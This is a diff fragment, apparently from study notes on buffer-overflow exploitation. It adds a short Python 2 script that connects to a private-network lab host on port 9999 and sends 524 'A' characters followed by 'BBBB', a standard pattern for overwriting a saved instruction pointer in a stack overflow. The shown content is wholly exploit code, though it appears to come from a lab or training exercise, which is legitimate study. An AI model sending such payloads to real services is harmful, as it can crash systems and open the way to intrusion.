@@ -30,5 +30,34 @@ except :
 s.close()
 ```
 
+sample socket code
 
+```text
+#!/usr/bin/python
+
+import socket
+
+junk = 'A'*524
+payload = junk + "BBBB"
+
+print payload
+
+try :
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+except :
+	print ("failed socket connection")
+
+host_ip = "192.168.137.104"
+host_port = 9999
+
+try:
+	connect = s.connect((host_ip, host_port))
+	data = s.recv(1024)
+	s.send(payload + '\r\n')
+	data = s.recv(1024)
+
+except:
+	print ("no")
+
+```
 
